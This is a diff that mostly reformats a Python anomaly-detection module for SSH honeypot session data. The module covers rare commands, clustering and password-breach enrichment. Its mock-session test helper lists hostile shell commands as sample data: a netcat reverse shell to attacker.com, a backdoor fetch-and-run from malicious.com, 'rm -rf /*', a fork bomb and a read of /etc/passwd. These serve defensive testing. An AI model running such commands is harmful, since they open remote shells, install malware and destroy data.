@@ -45,31 +45,31 @@ logger = logging.getLogger(__name__)
 @dataclass
 class LongtailAnalysisResult:
     """Results from longtail analysis."""
-    
+
     # Detection counts
     rare_command_count: int = 0
     anomalous_sequence_count: int = 0
     outlier_session_count: int = 0
     emerging_pattern_count: int = 0
     high_entropy_payload_count: int = 0
-    
+
     # Analysis metadata
     total_events_analyzed: int = 0
     total_sessions_analyzed: int = 0
     analysis_duration_seconds: float = 0.0
     memory_usage_mb: float = 0.0
-    
+
     # Feature flags
     vector_analysis_enabled: bool = False
     pgvector_available: bool = False
-    
+
     # Results storage
     rare_commands: List[Dict[str, Any]] = field(default_factory=list)
     anomalous_sequences: List[Dict[str, Any]] = field(default_factory=list)
     outlier_sessions: List[Dict[str, Any]] = field(default_factory=list)
     emerging_patterns: List[Dict[str, Any]] = field(default_factory=list)
     high_entropy_payloads: List[Dict[str, Any]] = field(default_factory=list)
-    
+
     # Statistical summary
     statistical_summary: Dict[str, Any] = field(default_factory=dict)
 
@@ -82,10 +82,7 @@ class CommandVectorizer:
     """Persistent vocabulary management for consistent vectorization."""
 
     def __init__(
-        self,
-        vocab_path: Optional[Path] = None,
-        max_features: int = 128,
-        ngram_range: Tuple[int, int] = (1, 3)
+        self, vocab_path: Optional[Path] = None, max_features: int = 128, ngram_range: Tuple[int, int] = (1, 3)
     ) -> None:
         """Initialize command vectorizer with persistent vocabulary.
 
@@ -220,9 +217,7 @@ def run_longtail_analysis(
     window_start = datetime.now(UTC) - timedelta(days=lookback_days)
 
     with session_factory() as session:
-        sessions = session.query(SessionSummary).filter(
-            SessionSummary.first_event_at >= window_start
-        ).all()
+        sessions = session.query(SessionSummary).filter(SessionSummary.first_event_at >= window_start).all()
 
     if not sessions:
         logger.warning(f"No sessions found for analysis window ({lookback_days} days)")
@@ -246,6 +241,7 @@ def run_longtail_analysis(
     # Output results
     if output_path:
         import json
+
         with open(output_path, 'w') as f:
             json.dump(result.__dict__, f, indent=2, default=str)
         logger.info(f"Results written to {output_path}")
@@ -338,7 +334,7 @@ class LongtailAnalyzer:
         # Performance optimizations
         self._command_cache: Dict[str, Dict[str, List[str]]] = {}
         self._memory_warning_threshold = 1.5 * 1024  # Default 1.5GB warning threshold
-    
+
     def analyze(self, sessions: List[SessionSummary], lookback_days: int) -> LongtailAnalysisResult:
         """Perform longtail analysis on sessions with resource monitoring.
 
@@ -363,7 +359,7 @@ class LongtailAnalyzer:
                 warning_threshold_mb = memory_limit_mb * self.memory_warning_threshold_fraction
                 logger.info(
                     f"Using user-specified memory limit: {self.memory_limit_gb:.1f}GB "
-                    f"(warning at {self.memory_warning_threshold_fraction*100:.0f}%)"
+                    f"(warning at {self.memory_warning_threshold_fraction * 100:.0f}%)"
                 )
             else:
                 # Auto-detect based on system memory
@@ -377,12 +373,12 @@ class LongtailAnalyzer:
                 else:  # Low-memory system (<16GB)
                     memory_limit_mb = 2 * 1024  # 2GB
                     warning_threshold_mb = memory_limit_mb * self.memory_warning_threshold_fraction
-                    
+
                 logger.info(
                     f"System memory: {total_memory_gb:.1f}GB, setting analysis limit to "
-                    f"{memory_limit_mb/1024:.1f}GB (warning at {self.memory_warning_threshold_fraction*100:.0f}%)"
+                    f"{memory_limit_mb / 1024:.1f}GB (warning at {self.memory_warning_threshold_fraction * 100:.0f}%)"
                 )
-            
+
             soft, hard = resource.getrlimit(resource.RLIMIT_AS)
             resource.setrlimit(resource.RLIMIT_AS, (int(memory_limit_mb * 1024 * 1024), hard))
             self._memory_warning_threshold = warning_threshold_mb
@@ -473,8 +469,7 @@ class LongtailAnalyzer:
 
         if result.memory_usage_mb > self._memory_warning_threshold:  # Dynamic warning threshold
             logger.warning(
-                f"High memory usage: {result.memory_usage_mb:.1f}MB "
-                f"(threshold: {self._memory_warning_threshold:.1f}MB)"
+                f"High memory usage: {result.memory_usage_mb:.1f}MB (threshold: {self._memory_warning_threshold:.1f}MB)"
             )
 
         logger.info(
@@ -515,10 +510,7 @@ class LongtailAnalyzer:
             for s in sessions:
                 stats = None
                 if isinstance(s.enrichment, dict):
-                    stats = (
-                        s.enrichment.get("password_stats")
-                        or s.enrichment.get("passwords")
-                    )
+                    stats = s.enrichment.get("password_stats") or s.enrichment.get("passwords")
 
                 if isinstance(stats, dict) and stats.get("total_attempts", 0) > 0:
                     ta = int(stats.get("total_attempts", 0))
@@ -536,30 +528,33 @@ class LongtailAnalyzer:
                         novel_hashes.extend([str(h) for h in nh])
                 else:
                     if (
-                        self.enable_password_enrichment and 
-                        len(sessions_needing_enrichment) < self.max_enrichment_sessions
+                        self.enable_password_enrichment
+                        and len(sessions_needing_enrichment) < self.max_enrichment_sessions
                     ):
                         sessions_needing_enrichment.append(s.session_id)
 
             # Opportunistic enrichment for a limited set of sessions
             enriched_details: List[Dict[str, Any]] = []
             if (
-                self.enable_password_enrichment and 
-                sessions_needing_enrichment and 
-                self._password_extractor and 
-                self._hibp_enricher
+                self.enable_password_enrichment
+                and sessions_needing_enrichment
+                and self._password_extractor
+                and self._hibp_enricher
             ):
                 # Fetch raw login events for target sessions in one query
                 try:
                     with self.session_factory() as db_session:
-                        result = db_session.execute(text(
-                            """
+                        result = db_session.execute(
+                            text(
+                                """
                             SELECT id, session_id, event_type, event_timestamp, payload
                             FROM raw_events
                             WHERE session_id = ANY(:session_ids)
                             AND event_type IN ('cowrie.login.success', 'cowrie.login.failed')
                             """
-                        ), {"session_ids": sessions_needing_enrichment})
+                            ),
+                            {"session_ids": sessions_needing_enrichment},
+                        )
 
                         # Convert rows to lightweight RawEvent-like objects
                         events_by_session: Dict[str, List[RawEvent]] = {}
@@ -593,14 +588,16 @@ class LongtailAnalyzer:
                                 novel_hashes.append(h)
                             total_attempts += 1
                             # Track limited details (hashes only)
-                            enriched_details.append({
-                                "session_id": sid,
-                                "username": attempt.get("username", ""),
-                                "password_sha256": h,
-                                "breached": bool(res.get("breached", False)),
-                                "prevalence": int(res.get("prevalence", 0)),
-                                "timestamp": attempt.get("timestamp", ""),
-                            })
+                            enriched_details.append(
+                                {
+                                    "session_id": sid,
+                                    "username": attempt.get("username", ""),
+                                    "password_sha256": h,
+                                    "breached": bool(res.get("breached", False)),
+                                    "prevalence": int(res.get("prevalence", 0)),
+                                    "timestamp": attempt.get("timestamp", ""),
+                                }
+                            )
                 except Exception as e:
                     logger.warning(f"Password gap enrichment failed: {e}")
 
@@ -644,9 +641,7 @@ class LongtailAnalyzer:
             }
 
     def benchmark_vector_dimensions(
-        self,
-        test_sessions: List[SessionSummary],
-        dimensions_to_test: List[int] = None
+        self, test_sessions: List[SessionSummary], dimensions_to_test: List[int] = None
     ) -> Dict[int, Dict[str, float]]:
         """Benchmark different vector dimensions for optimal performance.
 
@@ -693,9 +688,9 @@ class LongtailAnalyzer:
 
                 # Calculate quality metrics
                 silhouette = result.statistical_summary.get("avg_silhouette_score", 0.0)
-                detection_rate = (
-                    result.rare_command_count + result.anomalous_sequence_count
-                ) / max(result.total_sessions_analyzed, 1)
+                detection_rate = (result.rare_command_count + result.anomalous_sequence_count) / max(
+                    result.total_sessions_analyzed, 1
+                )
 
                 results[dim] = {
                     "duration": duration,
@@ -734,7 +729,7 @@ class LongtailAnalyzer:
         normal_sequence: List[str] = None,
         anomalous_sequence: List[str] = None,
         num_normal_sessions: int = 10,
-        num_anomalous_sessions: int = 3
+        num_anomalous_sessions: int = 3,
     ) -> List[SessionSummary]:
         """Create mock sessions with realistic command patterns for testing.
 
@@ -749,8 +744,16 @@ class LongtailAnalyzer:
         """
         if normal_sequence is None:
             normal_sequence = [
-                "ls", "cd /tmp", "wget http://example.com/file", "chmod +x file", "./file",
-                "cat /etc/passwd", "whoami", "uname -a", "ps aux", "df -h"
+                "ls",
+                "cd /tmp",
+                "wget http://example.com/file",
+                "chmod +x file",
+                "./file",
+                "cat /etc/passwd",
+                "whoami",
+                "uname -a",
+                "ps aux",
+                "df -h",
             ]
 
         if anomalous_sequence is None:
@@ -759,7 +762,7 @@ class LongtailAnalyzer:
                 "rm -rf /*",
                 ":(){ :|:& };:",  # Fork bomb
                 "nc -e /bin/sh attacker.com 4444",
-                "wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh"
+                "wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh",
             ]
 
         sessions = []
@@ -771,10 +774,7 @@ class LongtailAnalyzer:
             # Create realistic session with commands
             commands = []
             for j, cmd in enumerate(normal_sequence):
-                commands.append({
-                    "input": cmd,
-                    "timestamp": (datetime.now(UTC) - timedelta(minutes=j*2)).isoformat()
-                })
+                commands.append({"input": cmd, "timestamp": (datetime.now(UTC) - timedelta(minutes=j * 2)).isoformat()})
 
             # Create session summary (simplified for testing)
             session = SessionSummary(
@@ -788,7 +788,7 @@ class LongtailAnalyzer:
                 vt_flagged=False,
                 dshield_flagged=False,
                 risk_score=10,
-                matcher="test_matcher"
+                matcher="test_matcher",
             )
 
             # Store commands as JSON for testing (normally this would be in database)
@@ -802,10 +802,7 @@ class LongtailAnalyzer:
             # Create anomalous session with suspicious commands
             commands = []
             for j, cmd in enumerate(anomalous_sequence):
-                commands.append({
-                    "input": cmd,
-                    "timestamp": (datetime.now(UTC) - timedelta(minutes=j*1)).isoformat()
-                })
+                commands.append({"input": cmd, "timestamp": (datetime.now(UTC) - timedelta(minutes=j * 1)).isoformat()})
 
             # Create session summary
             session = SessionSummary(
@@ -819,7 +816,7 @@ class LongtailAnalyzer:
                 vt_flagged=True,
                 dshield_flagged=True,
                 risk_score=90,
-                matcher="test_matcher"
+                matcher="test_matcher",
             )
 
             # Store commands as JSON for testing
@@ -827,17 +824,16 @@ class LongtailAnalyzer:
             sessions.append(session)
 
         logger.info(
-            f"Created {len(sessions)} mock sessions "
-            f"({num_normal_sessions} normal, {num_anomalous_sessions} anomalous)"
+            f"Created {len(sessions)} mock sessions ({num_normal_sessions} normal, {num_anomalous_sessions} anomalous)"
         )
         return sessions
 
     def _calculate_session_duration(self, session: SessionSummary) -> float:
         """Calculate session duration in seconds.
-        
+
         Args:
             session: SessionSummary object
-            
+
         Returns:
             Duration in seconds, or 0 if not calculable
         """
@@ -845,7 +841,7 @@ class LongtailAnalyzer:
             duration = (session.last_event_at - session.first_event_at).total_seconds()
             return max(0.0, duration)
         return 0.0
-    
+
     def _extract_ip_from_session(self, session: SessionSummary) -> Optional[str]:
         """Extract IP address from session enrichment data or raw events."""
         try:
@@ -864,18 +860,21 @@ class LongtailAnalyzer:
                                     return key
                             except ValueError:
                                 continue
-            
+
             # Fallback: try to extract IP from raw events for this session
             try:
                 with self.session_factory() as db_session:
-                    result = db_session.execute(text("""
+                    result = db_session.execute(
+                        text("""
                         SELECT payload->>'src_ip' as src_ip
                         FROM raw_events 
                         WHERE session_id = :session_id 
                         AND payload->>'src_ip' IS NOT NULL
                         LIMIT 1
-                    """), {"session_id": session.session_id})
-                    
+                    """),
+                        {"session_id": session.session_id},
+                    )
+
                     row = result.fetchone()
                     if row and row.src_ip:
                         try:
@@ -886,17 +885,17 @@ class LongtailAnalyzer:
                             pass
             except Exception:
                 pass
-                
+
             return None
         except Exception:
             return None
-    
+
     def _extract_asn_from_session(self, session: SessionSummary) -> Optional[str]:
         """Extract ASN information from session enrichment data."""
         try:
             if not session.enrichment:
                 return None
-            
+
             enrichment = session.enrichment
             if isinstance(enrichment, dict) and "session" in enrichment:
                 session_data = enrichment["session"]
@@ -912,7 +911,7 @@ class LongtailAnalyzer:
             return None
         except Exception:
             return None
-    
+
     def _extract_command_data(self, sessions: List[SessionSummary]) -> None:
         """Extract command data from sessions for analysis.
 
@@ -929,7 +928,7 @@ class LongtailAnalyzer:
 
         # Query commands for all sessions in batches
         commands_by_session = self._extract_commands_for_sessions(session_ids)
-        
+
         # Extract IP addresses for all sessions in batch
         ip_by_session = self._extract_ips_for_sessions(session_ids)
 
@@ -962,7 +961,7 @@ class LongtailAnalyzer:
 
             # Build command sequences
             if len(commands) >= self.sequence_window:
-                sequence = ' '.join(commands[:self.sequence_window])
+                sequence = ' '.join(commands[: self.sequence_window])
                 if sequence.strip():
                     self._command_sequences.append(sequence)
 
@@ -981,11 +980,11 @@ class LongtailAnalyzer:
             return self._command_cache[cache_key]
 
         commands_by_session = defaultdict(list)
-        
+
         # Process sessions in batches to avoid memory issues
         batch_size = self.batch_size
         total_batches = (len(session_ids) + batch_size - 1) // batch_size
-        
+
         logger.info(f"Processing {len(session_ids)} sessions in {total_batches} batches of {batch_size}")
 
         try:
@@ -997,20 +996,22 @@ class LongtailAnalyzer:
                     start_idx = batch_num * batch_size
                     end_idx = min(start_idx + batch_size, len(session_ids))
                     batch_session_ids = session_ids[start_idx:end_idx]
-                    
+
                     logger.debug(
-                        f"Processing batch {batch_num + 1}/{total_batches} "
-                        f"({len(batch_session_ids)} sessions)"
+                        f"Processing batch {batch_num + 1}/{total_batches} ({len(batch_session_ids)} sessions)"
                     )
-                    
+
                     # Use a simpler approach that avoids problematic operators
                     # Don't check payload->>'input' in WHERE - do it in Python to avoid Unicode issues
-                    result = session.execute(text("""
+                    result = session.execute(
+                        text("""
                         SELECT session_id, payload
                         FROM raw_events
                         WHERE session_id = ANY(:session_ids)
                         AND event_type = 'cowrie.command.input'
-                    """), {"session_ids": batch_session_ids})
+                    """),
+                        {"session_ids": batch_session_ids},
+                    )
 
                     batch_commands = 0
                     for row in result:
@@ -1022,8 +1023,7 @@ class LongtailAnalyzer:
                                 if command_raw:
                                     # Clean Unicode control characters
                                     clean_command = ''.join(
-                                        char for char in str(command_raw) 
-                                        if ord(char) >= 32 or char in '\t\n\r'
+                                        char for char in str(command_raw) if ord(char) >= 32 or char in '\t\n\r'
                                     )
                                     clean_command = clean_command.strip()
                                     if clean_command:
@@ -1032,7 +1032,7 @@ class LongtailAnalyzer:
                         except (UnicodeDecodeError, UnicodeEncodeError, KeyError, TypeError) as e:
                             logger.warning(f"Error processing command from session {row.session_id}: {e}")
                             continue
-                    
+
                     logger.debug(f"Batch {batch_num + 1} extracted {batch_commands} commands")
 
         except Exception as e:
@@ -1044,32 +1044,35 @@ class LongtailAnalyzer:
         self._command_cache[cache_key] = dict(commands_by_session)
         logger.info(f"Extracted commands from {len(commands_by_session)} sessions")
         return dict(commands_by_session)
-    
+
     def _extract_ips_for_sessions(self, session_ids: List[str]) -> Dict[str, Optional[str]]:
         """Extract IP addresses for multiple sessions in batch.
-        
+
         Args:
             session_ids: List of session IDs to extract IPs for
-            
+
         Returns:
             Dictionary mapping session_id to IP address (or None if not found)
         """
         ip_by_session = {}
-        
+
         try:
             with self.session_factory() as session:
                 session.execute(text("SET TRANSACTION READ ONLY"))
-                
+
                 # Extract IPs from raw events in batch
-                result = session.execute(text("""
+                result = session.execute(
+                    text("""
                     SELECT session_id, payload
                     FROM raw_events 
                     WHERE session_id = ANY(:session_ids) 
                     AND payload IS NOT NULL
                     AND json_typeof(payload) = 'object'
                     ORDER BY session_id
-                """), {"session_ids": session_ids})
-                
+                """),
+                    {"session_ids": session_ids},
+                )
+
                 for row in result:
                     try:
                         payload = row.payload
@@ -1085,73 +1088,76 @@ class LongtailAnalyzer:
                                     continue
                     except (UnicodeDecodeError, UnicodeEncodeError, KeyError, TypeError):
                         continue
-                            
+
         except Exception as e:
             logger.warning(f"Error extracting IPs for sessions: {e}")
-        
+
         # Ensure all session IDs have an entry (even if None)
         for session_id in session_ids:
             if session_id not in ip_by_session:
                 ip_by_session[session_id] = None
-                
+
         return ip_by_session
 
     def _detect_rare_commands(self) -> List[Dict[str, Any]]:
         """Detect rare commands using frequency analysis with session metadata."""
         if not self._command_frequencies:
             return []
-        
+
         total_commands = sum(self._command_frequencies.values())
         rare_threshold = int(total_commands * self.rarity_threshold)
-        
+
         rare_commands = []
         for command, frequency in self._command_frequencies.items():
             if frequency <= rare_threshold:
                 rarity_score = frequency / total_commands
-                
+
                 # Get session metadata for this command
                 session_ids = self._command_to_sessions.get(command, [])
                 session_metadata = []
-                
+
                 for session_id in session_ids:
                     # Find session characteristics for this session
                     session_chars = next(
-                        (s for s in self._session_characteristics if s['session_id'] == session_id), 
-                        None
+                        (s for s in self._session_characteristics if s['session_id'] == session_id), None
                     )
                     if session_chars:
-                        session_metadata.append({
-                            'session_id': session_id,
-                            'src_ip': session_chars.get('src_ip'),
-                            'timestamp': session_chars.get('timestamp'),
-                            'duration': session_chars.get('duration', 0),
-                            'command_count': session_chars.get('command_count', 0),
-                        })
-                
-                rare_commands.append({
-                    'command': command,
-                    'frequency': frequency,
-                    'rarity_score': rarity_score,
-                    'detection_type': 'rare_command',
-                    'sessions': session_metadata,
-                    'session_count': len(session_metadata),
-                })
-        
+                        session_metadata.append(
+                            {
+                                'session_id': session_id,
+                                'src_ip': session_chars.get('src_ip'),
+                                'timestamp': session_chars.get('timestamp'),
+                                'duration': session_chars.get('duration', 0),
+                                'command_count': session_chars.get('command_count', 0),
+                            }
+                        )
+
+                rare_commands.append(
+                    {
+                        'command': command,
+                        'frequency': frequency,
+                        'rarity_score': rarity_score,
+                        'detection_type': 'rare_command',
+                        'sessions': session_metadata,
+                        'session_count': len(session_metadata),
+                    }
+                )
+
         # Sort by rarity (lowest frequency first)
         rare_commands.sort(key=lambda x: int(x['frequency']))
-        
+
         return rare_commands
-    
+
     def _detect_anomalous_sequences(self) -> List[Dict[str, Any]]:
         """Detect anomalous command sequences using clustering."""
         if len(self._command_sequences) < self.min_cluster_size:
             return []
-        
+
         try:
             # Vectorize command sequences
             if self.vector_analysis_enabled:
                 vectors = self.command_vectorizer.fit_transform(self._command_sequences)
-                
+
                 # Use DBSCAN clustering with error handling
                 try:
                     clustering = DBSCAN(
@@ -1167,58 +1173,64 @@ class LongtailAnalyzer:
                     sequence_freq: Dict[str, int] = {}
                     for seq in self._command_sequences:
                         sequence_freq[seq] = sequence_freq.get(seq, 0) + 1
-                    
+
                     anomalous_sequences = []
                     for seq, freq in sequence_freq.items():
                         if freq == 1:  # Unique sequences
-                            anomalous_sequences.append({
-                                'sequence': seq,
-                                'frequency': freq,
-                                'detection_type': 'anomalous_sequence',
-                                'anomaly_score': 1.0,
-                            })
-                    
+                            anomalous_sequences.append(
+                                {
+                                    'sequence': seq,
+                                    'frequency': freq,
+                                    'detection_type': 'anomalous_sequence',
+                                    'anomaly_score': 1.0,
+                                }
+                            )
+
                     return anomalous_sequences
-                
+
                 # Find outliers (noise points labeled as -1)
                 anomalous_sequences = []
                 for i, label in enumerate(cluster_labels):
                     if label == -1:  # Outlier
-                        anomalous_sequences.append({
-                            'sequence': self._command_sequences[i],
-                            'cluster_label': label,
-                            'detection_type': 'anomalous_sequence',
-                            'anomaly_score': 1.0,  # DBSCAN outliers are high anomaly
-                        })
-                
+                        anomalous_sequences.append(
+                            {
+                                'sequence': self._command_sequences[i],
+                                'cluster_label': label,
+                                'detection_type': 'anomalous_sequence',
+                                'anomaly_score': 1.0,  # DBSCAN outliers are high anomaly
+                            }
+                        )
+
                 return anomalous_sequences
             else:
                 # Fallback to simple frequency-based detection
                 sequence_freq: Dict[str, int] = {}
                 for seq in self._command_sequences:
                     sequence_freq[seq] = sequence_freq.get(seq, 0) + 1
-                
+
                 anomalous_sequences = []
                 for seq, freq in sequence_freq.items():
                     if freq == 1:  # Unique sequences
-                        anomalous_sequences.append({
-                            'sequence': seq,
-                            'frequency': freq,
-                            'detection_type': 'anomalous_sequence',
-                            'anomaly_score': 1.0,
-                        })
-                
+                        anomalous_sequences.append(
+                            {
+                                'sequence': seq,
+                                'frequency': freq,
+                                'detection_type': 'anomalous_sequence',
+                                'anomaly_score': 1.0,
+                            }
+                        )
+
                 return anomalous_sequences
-                
+
         except Exception as e:
             logger.error(f"Error in anomalous sequence detection: {e}")
             return []
-    
+
     def _detect_outlier_sessions(self) -> List[Dict[str, Any]]:
         """Detect outlier sessions using behavioral characteristics."""
         if len(self._session_characteristics) < self.min_cluster_size:
             return []
-        
+
         try:
             # Extract numerical features for clustering
             features = []
@@ -1230,9 +1242,9 @@ class LongtailAnalyzer:
                     session['file_operations'],
                 ]
                 features.append(feature_vector)
-            
+
             features_array = np.array(features)
-            
+
             # Use DBSCAN clustering with error handling
             try:
                 clustering = DBSCAN(
@@ -1259,63 +1271,67 @@ class LongtailAnalyzer:
                         # Check for high login attempts
                         if session['login_attempts'] > 10:  # Arbitrary threshold
                             is_outlier = True
-                        
+
                         if is_outlier:
-                            outlier_sessions.append({
-                                'session_id': session['session_id'],
-                                'src_ip': session['src_ip'],
-                                'duration': session['duration'],
-                                'command_count': session['command_count'],
-                                'login_attempts': session['login_attempts'],
-                                'file_operations': session['file_operations'],
-                                'cluster_label': -1,
-                                'detection_type': 'outlier_session',
-                                'anomaly_score': 1.0,
-                            })
-                
+                            outlier_sessions.append(
+                                {
+                                    'session_id': session['session_id'],
+                                    'src_ip': session['src_ip'],
+                                    'duration': session['duration'],
+                                    'command_count': session['command_count'],
+                                    'login_attempts': session['login_attempts'],
+                                    'file_operations': session['file_operations'],
+                                    'cluster_label': -1,
+                                    'detection_type': 'outlier_session',
+                                    'anomaly_score': 1.0,
+                                }
+                            )
+
                 return outlier_sessions
-            
+
             # Find outliers
             outlier_sessions = []
             for i, label in enumerate(cluster_labels):
                 if label == -1:  # Outlier
                     session = self._session_characteristics[i]
-                    outlier_sessions.append({
-                        'session_id': session['session_id'],
-                        'src_ip': session['src_ip'],
-                        'duration': session['duration'],
-                        'command_count': session['command_count'],
-                        'login_attempts': session['login_attempts'],
-                        'file_operations': session['file_operations'],
-                        'cluster_label': label,
-                        'detection_type': 'outlier_session',
-                        'anomaly_score': 1.0,
-                    })
-            
+                    outlier_sessions.append(
+                        {
+                            'session_id': session['session_id'],
+                            'src_ip': session['src_ip'],
+                            'duration': session['duration'],
+                            'command_count': session['command_count'],
+                            'login_attempts': session['login_attempts'],
+                            'file_operations': session['file_operations'],
+                            'cluster_label': label,
+                            'detection_type': 'outlier_session',
+                            'anomaly_score': 1.0,
+                        }
+                    )
+
             return outlier_sessions
-            
+
         except Exception as e:
             logger.error(f"Error in outlier session detection: {e}")
             return []
-    
+
     def _detect_emerging_patterns(self) -> List[Dict[str, Any]]:
         """Detect emerging patterns using temporal analysis."""
         # This is a simplified implementation
         # In a full implementation, this would analyze patterns over time
         emerging_patterns: List[Dict[str, Any]] = []
-        
+
         # Look for commands that appear in recent sessions but not in older ones
         # For now, return empty list as this requires temporal data
         return emerging_patterns
-    
+
     def _detect_high_entropy_payloads(self, sessions: List[SessionSummary]) -> List[Dict[str, Any]]:
         """Detect high entropy payloads in events."""
         high_entropy_payloads: List[Dict[str, Any]] = []
-        
+
         # This would require access to RawEvent data
         # For now, return empty list as this requires event-level analysis
         return high_entropy_payloads
-    
+
     def _generate_statistical_summary(self, result: LongtailAnalysisResult) -> Dict[str, Any]:
         """Generate statistical summary of analysis results."""
         summary = {
@@ -1344,12 +1360,13 @@ class LongtailAnalyzer:
             'performance_metrics': {
                 'analysis_duration_seconds': result.analysis_duration_seconds,
                 'events_per_second': (
-                    result.total_events_analyzed / result.analysis_duration_seconds 
-                    if result.analysis_duration_seconds > 0 else 0
+                    result.total_events_analyzed / result.analysis_duration_seconds
+                    if result.analysis_duration_seconds > 0
+                    else 0
                 ),
             },
         }
-        
+
         return summary
 
 
